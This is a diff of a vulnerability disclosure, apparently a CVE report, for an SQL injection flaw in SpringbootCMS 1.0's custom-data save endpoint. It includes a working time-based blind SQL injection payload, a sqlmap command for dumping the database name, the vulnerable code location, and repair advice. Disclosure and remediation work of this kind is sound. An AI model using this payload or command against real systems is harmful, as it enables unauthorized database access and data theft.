@@ -1,8 +1,16 @@
-# 0x01 vulnerability description
-JreCMS rapid development, dynamic addition of fields, custom tags, dynamic creation of database tables and crud data, database backup and recovery, dynamic addition of sites (multi-site function), one-click generation of template code, so that you can easily open to build your own independent website, but also easy secondary development, so that you can quickly build a personalized independent website. Background functions include: global configuration (configuration parameters, model management) Basic content (website information, company information, content columns) Content management (content data, label management) Extended content (message information, rotating pictures, links, custom forms, custom data) Public number management (wechat menu) System management (website management, system roles, system users, system User, system information, etc.) Database management, template management, jrecms directly spliced into SQL statements without filtering the parameters submitted by users, resulting in special characters in the parameters destroying the original logic of SQL statements, attackers can use this vulnerability to execute any SQL statement. Such as querying data, downloading data, writing webshell, executing system commands, and bypassing login restrictions. Hole address: http://ip:8888/admin/div_data/save
+# The name of an affected Product.
+Springboot version of JFinalcms or SpringbootCMS
+# The affected or fixed version(s).
+SpringbootCMS 1.0
+# The CVE ID for the entry
+CVE-2023-43192
+# A prose description
+SQL injection can exist ina newly created part of the JFinalcms background, and the parameters submitted by users are not filtered. As a result, special characters in parameters destroy the original logic of SQL statements. Attackers can use this vulnerability to execute any SQL statement.
+# Other supplement
+Hole address: http://ip:8888/admin/div_data/save
 The code download address: [https://gitee.com/heyewei/SpringBootCMS.git](https://gitee.com/heyewei/SpringBootCMS.git)
 Vulnerability location: After logging in to the system, the custom data of the expanded content, the location of the customer name at the time of creation has sql time blind annotation.
-# 0x02 exploit
+# exploit
 Vulnerability point
 ![image.png](https://cdn.nlark.com/yuque/0/2023/png/21570886/1694506585875-37cef292-a8c7-43f5-b254-1c72c67d0202.png#averageHue=%2368a489&clientId=u7c2a7c15-669d-4&from=paste&height=849&id=u6efc4d54&originHeight=973&originWidth=1913&originalType=binary&ratio=1.1458333730697632&rotation=0&showTitle=false&size=80981&status=done&style=none&taskId=udc6c8f14-6e01-4e87-a7d3-b110595cc16&title=&width=1669.527214829628)
  input 1212' AND (if(left(database(),13)='springbootcms',sleep(5),1)) AND 'OHiO'='OHiO
@@ -14,10 +22,10 @@ use sqlmap
 python sqlmap.py -r 127_0_0_1_8888_20230912161737.req --tamper=space2comment --batch --current-db
 sql is injected out of the database name.
 ![image.png](https://cdn.nlark.com/yuque/0/2023/png/21570886/1694507159752-18ebf8bb-589f-4622-8c93-e7e2976b6243.png#averageHue=%230e0d0d&clientId=u4204e0bc-9665-4&from=paste&height=765&id=u1c287bf8&originHeight=877&originWidth=1855&originalType=binary&ratio=1.1458333730697632&rotation=0&showTitle=false&size=155778&status=done&style=none&taskId=u17a93641-0116-471f-a688-0d80e1a0552&title=&width=1618.9090347668375)
-# 0x03 repair suggestion
+# Repair suggestion
 (1) Using precompiled statements, using PDO requires care not to concatenate variables directly into PDO statements. All query statements use the parameterized query interface provided by the database, and parameterized statements use parameters instead of embedding user input variables into the SQL statement. At present, almost all database systems provide parameterized SQL statement execution interface, which can effectively prevent SQL injection attacks.
 (2) Special characters entering the database (' "<>&*; Etc.) for escape processing, or encoding conversion.
-# 0x04 Website source code
+# Website source code
 The code is located on line 67 of  src/main/java/com/cms/controller/admin/DivDataController.java
 ![image.png](https://cdn.nlark.com/yuque/0/2023/png/21570886/1694508026138-9d9a2125-d121-4689-bccf-1bab727f9a12.png#averageHue=%232d2c2b&clientId=u79fd5107-38a1-4&from=paste&height=557&id=uc08618a0&originHeight=638&originWidth=1444&originalType=binary&ratio=1.1458333730697632&rotation=0&showTitle=false&size=115198&status=done&style=none&taskId=u0115bce8-5e44-4230-9a36-b91115905f5&title=&width=1260.2181381149937)
 Break point on line 70
